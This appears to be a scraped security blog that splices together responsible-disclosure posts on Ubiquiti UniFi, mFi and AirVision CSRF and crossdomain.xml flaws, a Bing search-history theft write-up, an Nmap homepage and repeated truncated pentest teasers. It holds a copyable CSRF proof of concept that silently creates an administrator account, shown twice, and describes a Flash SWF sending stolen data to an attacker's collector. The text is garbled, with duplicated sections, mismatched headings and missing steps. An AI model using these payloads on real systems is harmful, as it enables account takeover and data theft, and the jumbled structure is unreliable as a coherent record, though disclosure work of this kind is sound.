This CVE covers three separate Ubiquiti Networks applications that are all vulnerable to CSRF:

* UniFi Controller
* mFi Controller
* AirVision Controller

# Ubiquiti - UniFi Controller v2.4.6 - Cross-site Request Forgery (CSRF)

CWE-352: <http://cwe.mitre.org/data/definitions/352.html>

The UniFi application is vulnerable to CSRF in multiple locations.  The CWE link above has a great summary of the vulnerability.  In the POC below, I demonstrate how an unauthenticated attacker can send a malicious hyperlink to an authenticated administrator, and how if the administrator clicks on the link, the attacker can force the authenticated administrator to perform quite a few actions without knowing it.  The most serious POC involves the attacker causing the administrator to create a second administrator account.  The attacker can now log into the Unifi controller with this second account (if they have network access to the Unifi controller), and perform any actions that an administrator can make.

**CSRF POC #1– Add Admin**

This screenshot shows the Settings >> System page before CSRF attack. (The victim Admin logged into Unifi Controller)
![](https://lh4.googleusercontent.com/jUQ5YRvJRPdgEedzXqoF_zaEne2nXRH3Ul9KKiFAIh8rZu0xcPdE7Gb-n7_869b6UMOgrxaWxncd0CHR8od0Vwk-LNA6u62W_jtQ1lBXMGzAFWV4ggZEuDrM7-A_z6fNfulA2q66Rrs)

The victim navigates to the attacker’s malicious page (page source shown for clarification):
![](https://lh5.googleusercontent.com/fM111S1PrLurkDHp53y-e8dhmCfD4UsMCPev34CTgpDsNb9OmUHHe9U8IicBcusrdYVp6uOxVmDp_hjsy9U8fohCPsJlNd_xXbEB0V12qXrclZBO71SmBAYiupVYz0Y2aVrSGP35v8g)

Copyable POC:

```
<html>
<head>
<script>
function sendCSRF()
{
var url_base = "https://192.168.0.106:8443/api/add/admin"
var post_data="%7B%22name%22%3A%22csrf%22%2C%22lang%22%3A%22en_US%22%2C%22x_password%22%3A%22csrf%22%7D"

var xmlhttp;
xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", url_base, true);
xmlhttp.setRequestHeader("Accept","*/*");
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");
xmlhttp.withCredentials= "true";
xmlhttp.send(post_data);
}

</script>

<h1>CSRF POC</h1>
Sending CSRF Payload!!!
<body onload="sendCSRF()">

```
```
</html>
```

Here is a proxy view from the perspective of the victim Admin

* First the admin’s browser goes to [www.malicious-site.com](http://www.malicous-site.com/) and pulls the attackers CSRF payload page
* Then the admin’s browser loads the forged request that will add another admin on the UniFi Controller

![](https://lh3.googleusercontent.com/UpHcS2d8eYEwR-Z8g3MXPCDzZnVXJk63Gb3jErYMgqG8OY1qU6sEQt8zpDgZFkNIqBK1SyqeKiXKLXd1MscNStE1tTu5Zcaq7c_cDVYfsRwC1pV_V0zdXL2aXGM-98xNGmvgNusZEok)
The forged request is shown below. You can see that the Referer is [www.malicious-site.com/csrf.html](http://www.malicious-site.com/csrf.html), and not the Unifi Controller.  However, because of Same Origin Policy, when the admin makes the request to the Unifi Controller, the browser attaches the admin’s valid session cookie:
![](https://lh6.googleusercontent.com/HGxNTcBJGzCAi5iMJummUiQOOyDslpr04HjB2q-PZ2AyYCOFGJFwXX2zNAq17Oi0ksVNlfS3o3kTOlPBidJNC4T3rW1ZIiASvAdRriJ_mTxPmXHQNjx9Dd-szAFDovXYbyr67LEPHrQ)
The response, showing the new admin was created successfully:

The next two screenshots show the attacker logging in after the attack:

Settings >> System page after the CSRF attack

The next POC is another example of how an attacker can use CSRF to update and enable the syslog server on the Unifi Controller. I was working on this one before I figured out that the /api/add/admin function existed:

**CSRF POC #2 – Update syslog server**
Settings >> System (Before CSRF attack)

Here is the CSRF attack page on the attackers server:

In addition to these POCs, any function that does not have a non-predictable nonce included, is vulnerable to CSRF.  This includes:

POST /api/add/wlanconf

POST /api/set/setting/guest\_access

Change almost anything on this page (guest password, authentication method, restricted subnets):

# Ubiquiti - mFi Controller v2.0.15 - Cross-site Request Forgery (CSRF)

CWE-352: <http://cwe.mitre.org/data/definitions/352.html>

While this walk through is not as complete as the previous one, this screenshot shows that the mFi Controller exhibits the same CSRF vulnerability.  ![](https://lh3.googleusercontent.com/g9DHE4Ky6yo7CJh-3rP1nB74lq-2eo7hiRF2Dyr9OZ2g1AufqMfH0LD8JugQQIGQWWRiGiZKxsv6S4KJbI4zPBHQ4NAUCUReSwIlzi3lNJIYmi5aob4K6-b4Oh-v7Y_FnIwHPGQ46oM)

# Ubiquiti - AirVision Controller v2.1.3 - Cross-site Request Forgery (CSRF)

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

### [Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

There seems to be a common path for experienced penetration testers who are thrown into the world of cloud penetration testing. I'm talking about internal (aka assumed breach) tests, where the goal is to demonstrate the impact of a compromised user with access to the cloud or a compromised application in the cloud.  The path usually starts with ignorance, is followed by total confusion and questioning everything you know about penetration testing, and ends with… well, it never ends. Why? Because the cloud providers and the cloud native technologies running in these clouds keep evolving at a remarkable rate. There's always more to learn and more attack paths waiting to be found. I hope walking through my own path and defining the stages of ignorance and awareness I encountered in a playful way might help others progress through the early stages more quickly than I did.  Level 1: This is just like any other Internal Penetration Test, right? You connect to your assumed breach sta...

TL;DR There are a lot of great blogs out there that show you how to Kerberoast.  In this post, I'm going to walk through the process of setting up your lab so that you can practice this attack.  This involves creating a domain user and then mapping a SPN to that account. After that, I'll walk through using Empire to launch Invoke-Kerberoast, and I'll crack the hashes offline with Hashcat.

In Pentest Home Lab - 0x0 - Building a virtual corporate domain , we talked about why you would want to build your own AD pentest lab, where you can build it, and the pros and cons of each option. In Pentest Home Lab - 0x1 - Building Your AD Lab on AWS , we walked through setting up a fully functional home lab in AWS. In this third installment, I'm going to walk through setting up a pentest active directory home lab in your basement, closet, etc.  I'll be using Proxmox VE, an open source virtualization environment (aka hypervisor) similar to Vmware ESXi or Citrix XEN.

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html "permanent link")

This CVE covers a vulnerability found in the Ubiquiti Networks AirVision application.  For more background on this particular vulnerability, check out this post:

[Exploiting misconfigured crossdomain.xml files](http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html)

In fact, I wrote that first crossdomain.xml blog post after finding this AirVision vulnerability back in February.  If you already read that post, you should recognize the vulnerable form I use for the POC here (adding an administrator), is the same one I used earlier.

Here is a cleaned up version of what I sent to Ubiquiti back in February:

# AirVision Controller v2.1.3 - Overly Permissive default crossdomain.xml

CWE-264: <http://cwe.mitre.org/data/definitions/264.html>

**Misuse Case**

If the victim user is authenticated with their AirVision Controller, and they visit a malicious site, the owner of the malicious site can make changes to, and read data from, the AirVision Controller. The malicious site can even add a new administrative user account.

Vulnerable default configuration:

![](https://lh3.googleusercontent.com/L9EZPENjUAo8DKZCtd4x3_IwEO6xcBb2k-NaebevoLACzHy8s88Pu3IWrSkHFVhfiemS4Wzuv7eKc5cdCO26Vij3Z0zb6JBIsFFMWcXCjpf1YZFkq-1Vl-k7K_mxYH3j02o2km1tgqc)

POC:

**Step 1:** Attacker hosts the malicious SWF on his/her server, and socially engineers a victim AirVision administrator who is currently logged in, to view the SWF file

**Step 2:** The victim, while logged into AirVision, views the SWF file on the attackers server:

![](https://lh3.googleusercontent.com/NnrdzwtTW_9EVFHqsa5-PiA3Bsjo9Ypg50jaamO5Ddewjp43uZjTuj_IAtVGsEO_yuwsuM91fffIUbJJ2Qe058Emqlq3a_nACg2UWjKLX_EhQW0Xi964JziC3nssz4hz7RcTPnhHxXg)

![](https://lh5.googleusercontent.com/uPnlSMK7_8UxoaQ8AsudJuQEZ1CMMp89n8rnkCnYtLeMyuRfe9XGe_TF4f3jF5C8G-2PNZ0EHcmuV6PK_e2xaG1cTk7aizJ_LI6YpFt3IvjFpT8vXN1iuFr29V-6tSwti3IJedc8sKA)

**Step 3:** The SWF loads on the victims machine, and makes a request on behalf of the victim (exploiting CSRF to add an administrator):

![](https://lh3.googleusercontent.com/E6Fe7o3CbQj2wqiW-FFlkX3d26wxcuTJspKmuAovCRpPjJVychkxQ3F9VUQITPfDaKXK4c-ORKbuA8ko2KH6nwTuNdJN1D2_GdryRVJy0L33BbKlxtV5IDe7xqapaPlzNiDyNwYmow8)

Response:
![](https://lh5.googleusercontent.com/dL-Pf78AVMYAO_tBPpg1_7luXYgeRR9bnPibZ6WtTNXLjX_ZLxBTDo20fBrE9gaXyN7ScwMXG69w4mnnzzT84Zc_GDBmdEaYIjK7wJWH-Y4dYn5wSwkm_vZ1aiqaYk2G0iVKaoiRQrs)

**Step 4:** The SWF is able to bypass Same-Origin-Policy because of the overly permissive crossdomain.xml file, and it records the server response to the previous request, and sends that to the attacker:
![](https://lh4.googleusercontent.com/xN9QwKK3gJa5vAbatv9IjCdc300vI41Bw93qJkM7bDg37ISH9gWM4xlcizpUABNmvcYPCsLsHiKJPGLrAx7uq3SZhT0MvcAnWzCxk164AT-paLUzTqepe05IMxf-8y--Cl9OOb1AvLE)

The server receives the information and responds with a HTTP 200 OK.
![](https://lh5.googleusercontent.com/FyOVInWVphGVZIEueiRCuDvUd5A-ew1ZrFSGiX_EGiQVokAyUVQnI30LXrTNi1CvlpK0lZNdlxuMKiO33B-LSJcpnGaeBNAq3fYUfKPjR9QoR1eyxbKUEIpJdhCxvCn_i7An5TLA6iM)
Here is another example of how an attacker could exploit this vulnerability, that is much different than what CSRF can do. In the screenshot below, the SWF makes a request to /api/2.0/log?type=error.  The SWF then reads the data that comes back from that request and sends it to the attacker’s server, where the attacker consumes the raw data.

![](https://lh3.googleusercontent.com/ZQujzD6NAslweprDVE2HGoerJaO6QuIUWCYnv-lgyUvuC2wWfA3ECSV-_kuQhLChGqqlLFtYZNxPXteDOoVkT9FGSb8Eq9gXsK3qxFV8HIhtJfG5wlvp3lZwjxqdM0muvwGNCXEK6q0)

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "permanent link")

This CVE covers three separate Ubiquiti Networks applications that are all vulnerable to CSRF:

* UniFi Controller
* mFi Controller
* AirVision Controller

# Ubiquiti - UniFi Controller v2.4.6 - Cross-site Request Forgery (CSRF)

CWE-352: <http://cwe.mitre.org/data/definitions/352.html>

The UniFi application is vulnerable to CSRF in multiple locations.  The CWE link above has a great summary of the vulnerability.  In the POC below, I demonstrate how an unauthenticated attacker can send a malicious hyperlink to an authenticated administrator, and how if the administrator clicks on the link, the attacker can force the authenticated administrator to perform quite a few actions without knowing it.  The most serious POC involves the attacker causing the administrator to create a second administrator account.  The attacker can now log into the Unifi controller with this second account (if they have network access to the Unifi controller), and perform any actions that an administrator can make.

**CSRF POC #1– Add Admin**

This screenshot shows the Settings >> System page before CSRF attack. (The victim Admin logged into Unifi Controller)
![](https://lh4.googleusercontent.com/jUQ5YRvJRPdgEedzXqoF_zaEne2nXRH3Ul9KKiFAIh8rZu0xcPdE7Gb-n7_869b6UMOgrxaWxncd0CHR8od0Vwk-LNA6u62W_jtQ1lBXMGzAFWV4ggZEuDrM7-A_z6fNfulA2q66Rrs)

The victim navigates to the attacker’s malicious page (page source shown for clarification):
![](https://lh5.googleusercontent.com/fM111S1PrLurkDHp53y-e8dhmCfD4UsMCPev34CTgpDsNb9OmUHHe9U8IicBcusrdYVp6uOxVmDp_hjsy9U8fohCPsJlNd_xXbEB0V12qXrclZBO71SmBAYiupVYz0Y2aVrSGP35v8g)

Copyable POC:

```
<html>
<head>
<script>
function sendCSRF()
{
var url_base = "https://192.168.0.106:8443/api/add/admin"
var post_data="%7B%22name%22%3A%22csrf%22%2C%22lang%22%3A%22en_US%22%2C%22x_password%22%3A%22csrf%22%7D"

var xmlhttp;
xmlhttp = new XMLHttpRequest();
xmlhttp.open("POST", url_base, true);
xmlhttp.setRequestHeader("Accept","*/*");
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded; charset=UTF-8");
xmlhttp.withCredentials= "true";
xmlhttp.send(post_data);
}

</script>
</head>
<body>
<h1>CSRF POC</h1>
Sending CSRF Payload!!!
<body onload="sendCSRF()">
</body>

```
```
</html>
```

Here is a proxy view from the perspective of the victim Admin

* First the admin’s browser goes to [www.malicious-site.com](http://www.malicous-site.com/) and pulls the attackers CSRF payload page
* Then the admin’s browser loads the forged request that will add another admin on the UniFi Controller

![](https://lh3.googleusercontent.com/UpHcS2d8eYEwR-Z8g3MXPCDzZnVXJk63Gb3jErYMgqG8OY1qU6sEQt8zpDgZFkNIqBK1SyqeKiXKLXd1MscNStE1tTu5Zcaq7c_cDVYfsRwC1pV_V0zdXL2aXGM-98xNGmvgNusZEok)
The forged request is shown below. You can see that the Referer is [www.malicious-site.com/csrf.html](http://www.malicious-site.com/csrf.html), and not the Unifi Controller.  However, because of Same Origin Policy, when the admin makes the request to the Unifi Controller, the browser attaches the admin’s valid session cookie:

The response, showing the new admin was created successfully:

The next two screenshots show the attacker logging in after the attack:

The next POC is another example of how an attacker can use CSRF to update and enable the syslog server on the Unifi Controller. I was working on this one before I figured out that the /api/add/admin function existed:

**CSRF POC #2 – Update syslog server**

Here is a proxy view from the perspective of the victim Admin

* First the admin’s browser goes to [www.malicous-site.com](http://www.malicous-site.com/) and pulls the attackers CSRF payload page
* Then the admin’s browser loads the forged request that will add another admin on the AirVision Controller

The forged request is shown below. You can see that the Referrer is [www.malicious-site.com/csrf-airvision4.html](http://www.malicious-site.com/csrf-airvision4.html), and not the AirVision Controller.  However, because of Same Origin Policy, when the admin makes the request to the AirVision Controller, the browser attaches the admin’s valid session cookie:

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

Ubiquiti - UniFi Controller - Admin/root password hash sent via syslog

CWE-310: <http://cwe.mitre.org/data/definitions/310.html>

**Misuse case:**

An attacker who has access to network traffic between the UniFi controller and the configured syslog server, can retrieve the password hash and use it to access all managed access points, and potentially the UniFi controller as well.

**Details:**

If remote logging is enabled on the UniFi controller, the controller sends syslog messages to the configured syslog server. Contained within the syslog messages is the admin password hash that is used by both the UniFi controller, and all managed Access Points.

In the screenshot below, the auth key and the encrypted password are highlighted in yellow.

The password is encrypted using the legacy crypt(1) utility, which uses Traditional DES [128/128 BS SSE2], and can be recovered using John the Ripper:

Note: The salt (and hash) changes each time the message is sent, but the password can always be recovered.

Once you crack the password, you can log into any of the managed access points via SSH. This is actually the format of the password that is used by BusyBox:

The CVE was assigned as there is no utility (reason) for sending the admin password via syslog messages.

A web application vulnerable to Python code injection allows you to send Python code though the application to the Python interpreter on the target server. If you can execute python, you can likely call operating system commands. If you can run operating system commands, you can read/write files that you have access to, and potentially even launch a remote interactive shell (e.g., nc, Metasploit, Empire). The thing is, when I needed to exploit this on an external penetration test recently, I had a hard time finding information online about how to move from proof of concept (POC) to useful web application exploitation. Together with my colleague Charlie Worrell ( @decidedlygray ),  we were able to turn the Burp POC (sleep for 20 seconds) into a non interactive shell, which is what this post covers. Python code injection is a subset of server-side code injection, as this vulnerability can occur in many other languages (e.g., Perl and Ruby). In fact, for those of you who are CWE f...

I recently came across a Server Side Request Forgery (SSRF) vulnerability within an application that I assessed.  The application was hosted on Amazon EC2 and was using Node.js, Express.js, and as I found out later, Needle.js. Discovery   Manual Discovery In the discovery phase, I noticed a function of the application that was taking a user specified URL and displaying the first paragraph from that URL into the page.  This application allowed a user to share a URL with their friends, and grabbing the first paragraph was a feature that would provide the friends with more context. The thing is, when looking at my Burp history, I could not find the request to the URL that I specified in my logs.  This should raise an eyebrow!   This means that the server is taking the URL I specified, making a request on my behalf, and then returning the result to me. That right there is SSRF .  Then, the only question was: What is the risk? Automated Discover...

[July 17, 2014](https://sethsec.blogspot.com/2014/07/crossdomain-bing.html "permanent link")

In my [previous](http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html) [two](http://sethsec.blogspot.com/2014/03/exploiting-insecure-crossdomain.html) posts, I explain the overly permissive crossdomain.xml vulnerability, show you how to create malicious SWF files from scratch, and show you how to use the malicious SWFs to exploit the vulnerability.

As we all know, sometimes the best way to wrap your head around a vulnerability is to see it being exploited.  Rather than continuing to talk about the vulnerability in theoretical terms, I can now start to share some specific examples.

Microsoft has closed out my MSRC case, so I can share how I was able to exploit the crossdomain.xml file at www.bing.com, and land on their *[Security Researcher Acknowledgements for Microsoft Online Services](http://technet.microsoft.com/en-us/security/cc308575#0414)* page (a first for me).

**Misuse Case - Gaining access to a Bing.com user's saved search history**

If the victim user is authenticated with any live.com linked account (msn, outlook, etc), and they visit a malicious site, the owner of the malicious site can retrieve the victim user’s entire search history, including the sites they visited by way of the search engine.

**The vulnerable configuration (fixed now):**
![](https://lh4.googleusercontent.com/ybEcADaHZMEIpfVlpd1BI2l81i1xIrzaMADMAC3cNNAboOUHXj8lwmjwjpB4JFAxXEvybg7wRDi9vKnps8qj1Di41nBGjnqSXBJHsNpyu0Ge6N-c89B_NHFwchqh0STU_sSQT63B8W0)

Proof of Concept
**Note:** In the proof of concept, I show the attack from the perspective of the victim.  Unlike a real exploitation, the "victim" is going through Burp to illustrate what is going on behind the scenes.

Prerequisite:  The victim is currently authenticated with msn.com, live.com, bing.com, etc.  This is a screenshot of the victim logged in and viewing the information that we (the attacker) are going to steal.  The victim does not need to be on this particular page for the attack to work.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMmE-bzx9ezZa4evLeyJHT_Ja6teKX1uuZ3k_PvKFpppvhyeR1pLk8z6faZQzhxPUISaffxzFsDjQsDJYnTVo4us3yJYF6RUjw0lJwSjUmZDutq8Q5GuicEL9C2qY2Y3hy1RZU9fwCxt1l/s1600/2014-04-30+17_01_12-Bing+Search+History.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMmE-bzx9ezZa4evLeyJHT_Ja6teKX1uuZ3k_PvKFpppvhyeR1pLk8z6faZQzhxPUISaffxzFsDjQsDJYnTVo4us3yJYF6RUjw0lJwSjUmZDutq8Q5GuicEL9C2qY2Y3hy1RZU9fwCxt1l/s1600/2014-04-30%2B17_01_12-Bing%2BSearch%2BHistory.png)

Step 1: Attacker hosts a malicious SWF on his/her server, and socially engineers a victim to arrive at the attacker’s site.

Step 2: The victim, while logged into msn.com, live.com, bing.com, etc, loads the malicious html page:

![](https://lh3.googleusercontent.com/Q9552FSSfatESjWXK9iGNgDE9einj9siOZ1QgxE2xwOUzRPD2jSRBebCmpaC55e9AE66EiaGRPDcahIZPEjv97_TtD0fwS2VJOBdPHwO0iIOziM8H1pq8PJpMDRt02FT_Q)

As you can see, the POC html page just instructs the victim's browser to execute the SWF file.
![](https://lh4.googleusercontent.com/GrciJiySH4NGz9pW6tA1RMYvzzqx0gritX8S11Lz35vqFpa3z8bJloJz6PdqAZbb3PGms9Wgn8F1GFshdCHlGMUuComnhMPXw2miUDX_7il5Kr9cszWXLz8u3ZlVARicMkRfQAhcrN0)

Step 3: The victims browser downloads and loads the SWF

![](https://lh5.googleusercontent.com/cwcfBvn51xb9S26daLLB0Fz18uE_Ol761sERzOxhBXQA2enIMfyfYO4nUlZTxJLXQfWBzUO4FJUiSPk0pDg5DfyXXR-S78m1eYwTufcnpw5dW_4GV6gYPRLVq-QdriGarGN22kgJ3aw)

Step 4: The SWF, now loaded in the browser, makes a request to <https://www.bing.com/crossdomain.xml>. This is where the vulnerability lies. If the crossdomain.xml file at www.bing.com is set correctly, the Adobe Flash player won't let the SWF proceed. When the crossdomain.xml file is overly permissive, it instructs the SWF file that it is authorized to interact with the domain (www.bing.com).
![](https://lh3.googleusercontent.com/IBWJFz2_fDh2-dicjN7qOMXNyXgQv24PWirrl9YpWRKilV9_WmXy5YilP74-6yI2MMcHeZpwtDv-WsO0fT8Z3wghD0sHJLclXUsgf-CqNRNXx1g3vDi4ShL591MFc9eIImgDS4-htqE)

Step 5: The SWF makes a request on behalf of the victim and retrieves the user’s search history from <https://www.bing.com/profile/history> and <https://www.bing.com/profile/history/more>:

![](https://lh5.googleusercontent.com/dA2PbQdijjEtGFqKq6T0uIxp3D9qnU244RGm0NZnrGy1uYrR1sYpgrrXTgu-SyqB4LHWIlAGHDp0mndRmPT5dThWjoX_2kqVbfECKYMb5AaXRk637adGxsyHsQcfYE30x6mYD00saIw)

Step 6: Because of the overly permissive crossdomain.xml file, the SWF is able to bypass Same-Origin-Policy and record the server response to the previous request. The SWF sends the data retrieved from <https://www.bing.com/profile/history> to the attackers data drop page:
![](https://lh5.googleusercontent.com/aTsmPvjb_IU_UBx4O9aORkUXY0XNn6edHNk6lwG0SqX9Lsa2JS29nWUX5dQIqUqGNPB2e_ux5-pXEvcYxVopGyc11SUa9Mj0wv5QmcsDJYgrAZL3cF-skvS_Xdgp4wbn3H-NWaCaaWY)

At this point, the exploitation is over from the perspective of the victim. Let's switch to the attacker's perspective, and look at the stolen data.

Here is the data collector script on the attacker's server:
[![](https://lh4.googleusercontent.com/2AgQLUYxuIelkKOZMKXjb2f9IgbVSj875JUvuEQ9oK-44BY_Jfe3jwS9DTJ2SDuqsTMeDbyuJPDuSSJCc7Dhl5i3j2UvXKcnYezbpNRdgkqZacqdiecQ02NUkaezAU4ZICjCG2kHOhE)](https://lh4.googleusercontent.com/2AgQLUYxuIelkKOZMKXjb2f9IgbVSj875JUvuEQ9oK-44BY_Jfe3jwS9DTJ2SDuqsTMeDbyuJPDuSSJCc7Dhl5i3j2UvXKcnYezbpNRdgkqZacqdiecQ02NUkaezAU4ZICjCG2kHOhE)
As I mentioned in my previous post, this php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk, but this was sufficient for the POC that I sent to Microsoft.

Step 7: The attacker can now parse the stolen data. The command just parses out the search queries from the source code of the stolen page. What is shown is basically the last 10 or so things I searched for on my Microsoft Surface.

root@kali:/var/www# cat /tmp/bing.txt | xmllint --format - | grep "sh\_item\_qu\_query"

![](https://lh3.googleusercontent.com/6RbWfU6BUTwS4uOmhouNjc29v5-6CqDIR9G4c6DBTY5I_OqpBzCkmyuv_qi_q43yinIfOZINvJxIye866D9z-ey6q1Dk5MaFZAn0NhzEDE_lDF2HVdV9O4O0LASbR5Ys9ZotqaWO0E0)

**This next command does the same thing, but it extracts the URL's that I visited as a result of my bing searches:**

